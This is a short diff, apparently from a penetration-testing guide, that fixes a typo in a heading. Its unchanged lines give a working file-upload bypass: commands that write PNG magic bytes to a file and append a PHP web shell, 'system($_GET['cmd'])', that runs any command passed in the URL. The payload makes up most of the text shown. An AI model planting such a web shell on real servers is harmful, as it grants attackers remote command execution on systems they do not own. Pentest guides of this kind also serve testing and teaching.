@@ -15,7 +15,7 @@ Create an empty PNG formatted file:
 printf "\x89PNG\r\n\x1a\n" > payload.png
 ```
 
-Append PHP-Paylaod:
+Append PHP-Payload:
 ```
 echo "<?php system(\$_GET['cmd']); ?>" >> payload.png
 ```
